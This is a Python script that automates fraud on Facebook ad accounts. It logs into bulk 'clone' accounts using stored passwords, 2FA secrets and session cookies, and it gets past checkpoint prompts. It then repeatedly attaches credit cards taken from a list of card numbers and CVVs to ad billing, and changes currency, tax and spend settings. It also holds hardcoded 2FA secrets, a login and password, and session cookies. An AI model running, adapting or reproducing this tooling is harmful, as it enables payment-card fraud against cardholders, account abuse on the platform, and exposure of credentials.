from time import sleep as sl
from http.cookies import SimpleCookie
from bs4 import BeautifulSoup as BS
from requests import session
import random
import requests
import mechanize

import threading

count_add_card_success=0
count_list_clone = 0

class Card:
	def __init__(self,code,date,ccv):
		self.code = code
		self.date = date
		self.ccv = ccv

class Acc:
	def __init__(self,tk,mk,fa,cookies):
		self.tk = tk
		self.mk = mk
		self.fa = fa
		self.cookies = cookies

def convert_cookie_to_json(string_cookie):
	temp= string_cookie.replace(" ", "")
	temp = temp.split(";")
	listKey = ["sb","datr","c_user","xs","fr"]
	listCookies = []
	for i in temp:
		key = i.split("=")[0]
		if key in listKey:
			listCookies.append(i)
	string_cookie=";".join(listCookies)
	try:
		cookie = SimpleCookie()
		cookie.load(string_cookie)
		cookies = {}
		for key, morsel in cookie.items():
		    cookies[key] = morsel.value
		return cookies
	except:
		return ""

def get2FA(fa):
	p = requests.get("https://2fa.live/tok/"+fa)
	return p.json()['token']

def listCloneCookie():
	f = open("clone.txt","r+")
	data = f.readlines()
	cookies = []
	for d in data:
		cookie = d.split("|")
		cookies.append(cookie[3])
	return cookies

# def listCloneAcc():
# 	f = open("clone.txt","r+")
# 	data = f.readlines()
# 	accs = []
# 	for d in data:
# 		cookie = d.split("|")
# 		fa = cookie[2]
# 		fa = fa.replace(" ","")
# 		acc = Acc(cookie[0],cookie[1],fa,cookie[3])
# 		accs.append(acc)
# 	return accs

def listCloneAcc():
	f = open("clone.txt","r+")
	data = f.readlines()
	accs = []
	for d in data:
		cookie = d.split("|")
		fa = "4ITIIN6K2VMMQH4JGKXGH7TJEFZYEARE" #cookie[3]
		fa = fa.replace(" ","")
		acc = Acc(cookie[0],cookie[1],fa,cookie[2])
		accs.append(acc)
	return accs

# def tick_card_used(card):
# 	data = open("testcard.txt", "r+").readlines()
# 	saveCard = ""
# 	for d in data:
# 		temp = d.replace("\n","")
# 		temp = temp.split("|")
# 		if str(temp[0]) == str(card.code):
# 			try:
# 				count = int(temp[4])
# 				value = temp[0]+"|"+temp[1]+"|"+temp[2]+"|"+temp[3]+"|"+str(count+1)+"\n"
# 				saveCard+=value
# 			except:
# 				value = temp[0]+"|"+temp[1]+"|"+temp[2]+"|"+temp[3]+"|1\n"
# 				saveCard+=value
# 	f = open("testcard.txt", "a+")
# 	f.truncate(0)
# 	f = open("testcard.txt", "a+")
# 	f.write(saveCard)






def check_card_used(card):
	for c in listCard():
		if card.code == c.code:
			f = open("testcard.txt", "a+")
			# f.truncate(0)


def listCard():
	f = open("card.txt","r+")
	data = f.readlines()
	cards = []
	for c in data:
		temp = c.split("|")
		date = temp[1]+temp[2][2:]
		card = Card(temp[0],date,temp[3])
		cards.append(card)
	return cards

def getAccountId(driver):
	url = driver.current_url
	acc = url.split("account_id=")
	acc_id = ""
	for i in acc[1]:
		if i=="&":
			break
		acc_id+=i
	return acc_id
def get_fb_dtsg(cookies):
	try:
		gets = requests.get("https://www.facebook.com",cookies = cookies)
		soup = BS(gets.content, "html.parser")
		gets = str(gets.text)
		gets = cut_string(gets,'["DTSGInitialData",[],{"token":"',True)
		gets = cut_string(gets,'"',False)
		return gets
	except:
		return None
def setLimitWithApi(driver,tk,cookie):
	print("hello")
	cookies = convert_cookie_to_json(cookie)
	fb_dtsg = get_fb_dtsg(cookies)
	url = "https://m.facebook.com/api/graphql/"
	data = {
		'fb_dtsg': fb_dtsg,
		'fb_api_caller_class': 'RelayModern',
		'fb_api_req_friendly_name': 'useBillingUpdateAccountSpendLimitScreenMutation',
		'variables': '{"input":{"client_mutation_id":"8","actor_id":"'+tk+'","billable_account_payment_legacy_account_id":"'+getAccountId(driver)+'","new_spend_limit":{"amount":"0.1","currency":"USD"}}}',
		'doc_id': '5615899425146711'
	}
	requests.post(url,data = data, cookies = cookies)

def saveAccSuccess(acc):
	f = open("clonesuccess.txt","a+")
	f.write(acc.tk+"|"+acc.mk+"|"+acc.fa)


def cut_string(string,key,choice):
	index = string.find(key)
	if choice:
		string = string[index+len(key):]
	else:
		string = string[0:index]
	return string

def get_account_id(cookies):
	url = "https://www.facebook.com/business_payments"
	p = requests.get(url,cookies = cookies)
	data = str(p.text)
	data = cut_string(data,'"props":{"account_id":"',True)
	data = cut_string(data,'"',False)
	return data

def check_added_card(cookies,fb_dtsg,account_id):
	url = "https://m.facebook.com/api/graphql/"
	headers = {
				'user-agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.41 Safari/534.7'
	}
	data = {
		'fb_dtsg': fb_dtsg,
		'variables': '{"paymentAccountID":"'+account_id+'"}',
		'doc_id': '5286352154719076'
	}
	p = requests.post(url,data=data,cookies = cookies,headers = headers)
	try:
		data = p.json()
		check_added_card = data['data']['viewer']['billable_accounts']['edges'][0]['node']['funding_source']['display_string']
		if "VISA" in check_added_card:
			return True
		return False
	except:
		return False

def set_country_and_currentcy(cookies,fb_dtsg,account_id):
	url = "https://m.facebook.com/api/graphql/"
	myID = cookies['c_user']
	data = {
		'fb_dtsg': fb_dtsg,
		'variables': '{"input":{"client_mutation_id":"3","actor_id":"'+myID+'","billable_account_payment_legacy_account_id":"'+account_id+'","currency":"TWD","logging_data":{"logging_counter":13,"logging_id":"113367954"},"tax":{"business_address":{"city":"","country_code":"TW","state":"","street1":"","street2":"","zip":""},"business_name":"","is_personal_use":false,"second_tax_id":"","second_tax_id_type":null,"tax_exempt":false,"tax_id":"","tax_id_type":"NONE"},"timezone":"Asia/Jakarta"}}',
		'doc_id': '5428097817221702'
	}
	requests.post(url,data = data, cookies = cookies)
	print("đổi tiền thành công")
def set_country_and_currentcy_lol(cookies,fb_dtsg,account_id):
	url = "https://m.facebook.com/api/graphql/"
	myID = cookies['c_user']
	data = {
		'fb_dtsg': fb_dtsg,
		'variables': '{"input":{"client_mutation_id":"3","actor_id":"'+myID+'","billable_account_payment_legacy_account_id":"'+account_id+'","currency":"TWD","logging_data":{"logging_counter":13,"logging_id":"526291686"},"tax":{"business_address":{"city":"","country_code":"TW","state":"","street1":"","street2":"","zip":""},"business_name":"","is_personal_use":false,"tax_id":"1234567891025"},"timezone":"Asia/Jakarta"}}',
		'doc_id': '5428097817221702'
	}
	requests.post(url,data = data, cookies = cookies)
	print("đổi tiền thành công")
def list_card():
	f = open("card.txt","r+")
	data = f.readlines()
	cards = []
	for c in data:
		temp = c.split("|")
		date = temp[1]+"|"+temp[2]
		card = Card(temp[0],date,temp[3])
		cards.append(card)
	return cards

def add_card(cookies,fb_dtsg,account_id,card):
	myID = cookies['c_user']
	url = "https://m.secure.facebook.com/ajax/payment/token_proxy.php?tpe=%2Fapi%2Fgraphql%2F"
	card_first_6 = card.code[:6]
	card_last_4 = card.code[len(card.code)-4:]
	date = card.date.split("|")
	month = date[0]
	year = date[1]

	if int(month) < 10:
		month = month[1]

	data = {
		'fb_dtsg': fb_dtsg,
		'variables': '{"input":{"client_mutation_id":"6","actor_id":"'+myID+'","billing_address":{"country_code":"BD"},"billing_logging_data":{"logging_counter":28,"logging_id":"3221251053"},"cardholder_name":"abcde","credit_card_first_6":{"sensitive_string_value":"'+card_first_6+'"},"credit_card_last_4":{"sensitive_string_value":"'+card_last_4+'"},"credit_card_number":{"sensitive_string_value":"'+card.code+'"},"csc":{"sensitive_string_value":"'+card.ccv+'"},"expiry_month":"'+month+'","expiry_year":"'+year+'","payment_account_id":"'+account_id+'","payment_type":"MOR_ADS_INVOICE","unified_payments_api":true}}',
		'doc_id': '4126726757375265'
	}
	requests.post(url,data = data, cookies = cookies)
	
def set_limit(cookies,fb_dtsg,account_id):
	myID = cookies['c_user']
	url = "https://m.facebook.com/api/graphql/"
	data = {
		'fb_dtsg': fb_dtsg,
		'fb_api_caller_class': 'RelayModern',
		'fb_api_req_friendly_name': 'useBillingUpdateAccountSpendLimitScreenMutation',
		'variables': '{"input":{"client_mutation_id":"8","actor_id":"'+myID+'","billable_account_payment_legacy_account_id":"'+account_id+'","new_spend_limit":{"amount":"1","currency":"TWD"}}}',
		'doc_id': '5615899425146711'
	}
	requests.post(url,data = data, cookies = cookies)
	print("set limit thành công")
def approve(cookies,fb_dtsg,account_id):
	myID = cookies['c_user']
	url = "https://m.facebook.com/api/graphql/"
	data = {
		'fb_dtsg': fb_dtsg,
		'fb_api_caller_class': 'RelayModern',
		'fb_api_req_friendly_name': 'useBillingPreauthPermitMutation',
		'variables': '{"input":{"client_mutation_id":"1","actor_id":"'+myID+'","billable_account_payment_legacy_account_id":"'+account_id+'","entry_point":"BILLING_2_0"}}',
		'doc_id': '3514448948659909'
	}
	requests.post(url,data = data, cookies = cookies)
def set_tax(cookies,fb_dtsg,account_id):
	myID = cookies['c_user']
	url = "https://m.facebook.com/api/graphql/"
	data = {
		'fb_dtsg': fb_dtsg,
		'fb_api_caller_class': 'RelayModern',
		'fb_api_req_friendly_name': 'BillingAccountInformationUtilsUpdateAccountMutation',
		'variables': '{"input":{"client_mutation_id":"2","actor_id":"'+myID+'","billable_account_payment_legacy_account_id":"'+account_id+'","currency":null,"logging_data":{"logging_counter":9,"logging_id":"3577491254"},"tax":{"business_address":{"city":"abcdefgh","country_code":"US","state":"AK","street1":"abcdefgh","street2":"abcdefgh","zip":"10000"},"business_name":"abcdefgh","is_personal_use":false},"timezone":null}}',
		'doc_id': '5428097817221702'
	}
	requests.post(url,data = data, cookies = cookies)
	print("set tax thành công")
def change_language(cookies,fb_dtsg):
	url = "https://m.facebook.com/intl/ajax/save_locale/"
	data = {
		'fb_dtsg': fb_dtsg,
		'loc': 'en_US'
	}
	requests.post(url,data = data, cookies = cookies)
def auto_add_card(acc):
	global count_add_card_success
	check_add_card_success = False
	cookies = convert_cookie_to_json(acc.cookies)
	fb_dtsg = get_fb_dtsg(cookies)
	print(fb_dtsg)
	change_language(cookies,fb_dtsg)
	account_id = get_account_id(cookies)
	print(account_id)
	set_country_and_currentcy_lol(cookies,fb_dtsg,account_id)
	for i in range(5):
		if not check_added_card(cookies,fb_dtsg,account_id):
			sl(2)
			card = random.choice(list_card())
			add_card(cookies,fb_dtsg,account_id,card)
		else:
			check_add_card_success = True
			break

	if check_add_card_success:
		set_limit(cookies,fb_dtsg,account_id)
		# set_tax(cookies,fb_dtsg,account_id)
		saveAccSuccess(acc)
		count_add_card_success+=1
		print("Add thành công: "+str(count_add_card_success)+"/"+str(count_list_clone))
	else:
		print("Thẻ đã chết hoặc clone đã die")

def login(email,pw,fa):
	browser = mechanize.Browser()
	browser.set_handle_robots(False)
	cookies = mechanize.CookieJar()
	browser.set_cookiejar(cookies)
	browser.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.41 Safari/534.7')]
	browser.set_handle_refresh(False)
	url = 'http://m.facebook.com/login.php'
	browser.open(url)
	browser.select_form(nr = 0)
	browser.form['email'] = email
	browser.form['pass'] = pw
	response = browser.submit()

	browser.open("https://m.facebook.com/checkpoint/?__req=7")
	browser.select_form(nr = 0)
	browser.form['approvals_code'] = get2FA(fa)
	response = browser.submit()

	for i in range(3):
		try:
			browser.open("https://m.facebook.com/login/checkpoint/")
			browser.select_form(nr = 0)
			response = browser.submit()
		except:
			pass

	# print(response.read())

	return str(browser._ua_handlers['_cookies'].cookiejar)
	


def getCookie(listCookies):
	listCookies = listCookies.split("CookieJar")
	listCookies = listCookies[1]
	listCookies = listCookies[1:len(listCookies)-2]
	listCookies = " "+listCookies
	listCookies = listCookies.split(",")
	result = ""
	for cookie in listCookies:
		temp = cookie.split(" ")
		if temp[2]!="noscript=1":
			result+=temp[2]+";"
	result = result[0:len(result)-1]
	return result

# print(getCookie(login("100082567838909","melvindgvmclaughlin615","Q3OIYANFSR5CRRU2TC3YEXLD7LACQ2JN")))


arrThread = []
listClone = listCloneAcc()
count = 1
count_list_clone = len(listClone)
for acc in listClone:
	t = threading.Thread(target = auto_add_card,args=(acc,))
	arrThread.append(t)
	# break
	# if count == 30:
	# 	break
	# count+=1
for t in arrThread:
	t.start()



# cookies = convert_cookie_to_json('c_user=100081978557969; xs=26:tGF23z9wKEssKA:2:1654839320:-1:-1; oo=; |4SNAOMWY76FPDPN23Z25BDGLMW5WLZ3L=; dpr=1.25; fr=0bNV7IqMIigocDRDr.AWUELXRUzl8qi9Wa9TMZaTBfIcY.BivaWd.9W.AAA.0.0.BivaWd.AWWgRSXg0LE; sb=naW9YpKno3tE2ajT0tCDv-7X; datr=naW9YklkJh6mYJf9TfKaZBRC; m_pixel_ratio=1.25; wd=1536x864')

# print(check_added_card(cookies,'NAcMBlP_VrjWWZCH-FFKLa4C1sfLzaksp35UjQvXcyeS1vxquFpzvVA:15:1654769525','3227700224173890'))
